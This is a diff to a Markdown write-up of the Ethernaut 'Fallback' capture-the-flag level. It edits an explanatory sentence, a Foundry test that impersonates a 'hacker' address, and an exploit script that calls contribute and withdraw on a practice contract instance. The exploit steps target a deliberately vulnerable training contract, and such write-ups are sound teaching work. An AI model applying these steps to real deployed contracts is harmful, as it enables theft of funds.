@@ -106,7 +106,7 @@ function withdraw() public onlyOwner {
 <br>
 
 
-  - however, the contribution made by the user would need to be greater than `1000 eth`, made by the owner in the constructor:
+  - however, the contribution made by the user would need to be greater than `1000 eth` (to beat the one made by the owner in the constructor):
 
 
 <br>
@@ -241,6 +241,8 @@ contract FallbackTest is Test {
 
     function testFallbackHack() public {
 
+        vm.startPrank(hacker);
+
         ////////////////////////////////////////
         //                                    //
         //        STEP 1: RECON               //
@@ -282,7 +284,6 @@ contract FallbackTest is Test {
         ////////////////////////////////////////
         // contribute with msg.sender to hacker
         ////////////////////////////////////////
-        vm.startPrank(hacker);
         level.contribute{value: 1 wei}();
 
         /////////////////////////////////// 
@@ -314,7 +315,9 @@ contract FallbackTest is Test {
         //                                    //
         ////////////////////////////////////////
         level.withdraw();
+        
         vm.stopPrank();
+        
         }
 }
 ```
@@ -387,9 +390,9 @@ Ran 1 test suites: 1 tests passed, 0 failed, 0 skipped (1 total tests)
 ```solidity
 contract Exploit is Script {
 
-      //////////////////////////////
-      // Change the current instance address
-      //////////////////////////////
+      /////////////////////////////////////////
+      // CHANGE: to the current instance address
+      /////////////////////////////////////////
     
       address level_instance = 0xD4E2471CA863251b61a1009223Ee23D2F23f057d;
       Fallback level = Fallback(payable(address(level_instance)));
